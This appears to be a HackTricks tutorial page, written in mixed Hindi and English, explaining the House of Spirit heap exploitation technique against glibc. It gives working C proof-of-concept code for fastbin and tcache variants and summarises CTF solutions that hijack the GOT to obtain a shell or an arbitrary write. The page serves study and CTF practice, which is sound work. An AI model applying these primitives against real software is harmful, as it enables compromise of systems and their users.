# House of Spirit

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

### Code

<details>

<summary>House of Spirit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### लक्ष्य

- tcache / fast bin में एक address जोड़ सकना ताकि बाद में उसे allocate करना संभव हो

### आवश्यकताएँ

- इस अटैक के लिए आक्रमणकर्ता को कुछ fake fast chunks बना पाने में सक्षम होना चाहिए जो सही स्थानों पर उनके size मान को दर्शाएँ और फिर पहले fake chunk को free करवा कर उसे bin में जाने में सक्षम होना चाहिए।
- With **tcache (glibc ≥2.26)** यह अटैक और भी सरल है: केवल एक fake chunk ही पर्याप्त है (tcache path पर कोई next-chunk size चेक नहीं किया जाता) जब तक fake chunk 0x10-aligned हो और उसका size field किसी वैध tcache bin (0x20-0x410 on x64) में आता हो।

### हमला

- उन fake chunks को बनाएं जो security checks को bypass कर सकें: मूलतः आपको 2 fake chunks चाहिए होंगे जो सही स्थानों पर सही sizes दिखाएँ
- किसी तरह पहले fake chunk को free करवा कर उसे fast या tcache bin में डालें और फिर उसे allocate करके उस address को overwrite करें

**The code from** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **is great to understand the attack.** हालांकि कोड का यह schema इसे काफी अच्छे से सारांशित करता है:

<details>
<summary>Fake chunk लेआउट</summary>
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
</details>

> [!TIP]
> ध्यान दें कि कुछ सत्यापन चेक्स को बायपास करने के लिए दूसरा chunk बनाना आवश्यक है।

### Tcache house of spirit (glibc ≥2.26)

- आधुनिक glibc में **tcache fast-path** अगले chunk के size/`prev_inuse` को सत्यापित करने से पहले `tcache_put` को कॉल करता है, इसलिए केवल वर्तमान fake chunk को ही सही दिखना चाहिए।
- आवश्यकताएँ:
- Fake chunk को **16-byte aligned** होना चाहिए और वह `IS_MMAPPED`/`NON_MAIN_ARENA` के रूप में चिह्नित नहीं होना चाहिए।
- `size` को एक tcache bin से संबंधित होना चाहिए और इसमें **prev_inuse bit set** (`size | 1`) शामिल होना चाहिए।
- उस bin के लिए Tcache भरा हुआ नहीं होना चाहिए (डिफ़ॉल्ट अधिकतम 7 entries)।
- न्यूनतम PoC (stack chunk):
```c
unsigned long long fake[6] __attribute__((aligned(0x10)));
// chunk header at fake[0]; usable data starts at fake+2
fake[1] = 0x41;              // fake size (0x40 bin, prev_inuse=1)
void *p = &fake[2];          // points inside fake chunk
free(p);                     // goes straight into tcache
void *q = malloc(0x30);      // returns stack address fake+2
```
- **Safe-linking** यहाँ कोई बाधा नहीं है: forward pointer जो tcache में स्टोर होता है, `free` के दौरान अपने आप `fd = ptr ^ (heap_base >> 12)` के रूप में encode हो जाता है, इसलिए attacker को single fake chunk का उपयोग करते समय key जानने की जरूरत नहीं होती।
- यह variant तब handy है जब glibc hooks हटाए गए हों (≥2.34) और आप एक तेज़ arbitrary write चाहते हों या बिना अतिरिक्त भ्रष्टाचार के किसी target buffer (e.g., stack/BSS) को एक tcache chunk के साथ overlap करना चाहते हों।

## Examples

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak**: एक overflow के माध्यम से यह संभव है कि एक pointer को बदलकर वह GOT address की ओर इशारा करे, ताकि CTF के read action के जरिए एक libc address को leak किया जा सके।
- **House of Spirit**: "rifles" की संख्या गिनने वाले एक counter का दुर्व्यवहार करके पहले fake chunk का fake size जनरेट करना संभव है, फिर एक "message" के दुर्व्यवहार से chunk का दूसरा size fake किया जा सकता है और अंत में एक overflow के दुर्व्यवहार से उस pointer को बदलना संभव होता है जिसे free किया जाना है ताकि हमारा पहला fake chunk free हो जाए। फिर, हम उसे allocate कर सकते हैं और उसके अंदर वह address होगा जहाँ "message" स्टोर है। फिर, इसे GOT तालिका में `scanf` entry की ओर इशारा करने के लिए बनाना संभव है, ताकि हम इसे system के address से overwrite कर सकें.\
Next time `scanf` is called, we can send the input `"/bin/sh"` and get a shell.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak**: Uninitialized stack buffer.
- **House of Spirit**: हम heap pointers के global array के पहले index को modify कर सकते हैं। एक single byte modification के साथ, हम एक valid chunk के अंदर एक fake chunk पर `free` का उपयोग करते हैं, ताकि फिर से allocate करने पर overlapping chunks की स्थिति बन जाए। इसके साथ, एक सरल Tcache poisoning attack arbitrary write primitive पाने के लिए काम करता है।

## References

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)
- [https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c)

{{#include ../../banners/hacktricks-training.md}}
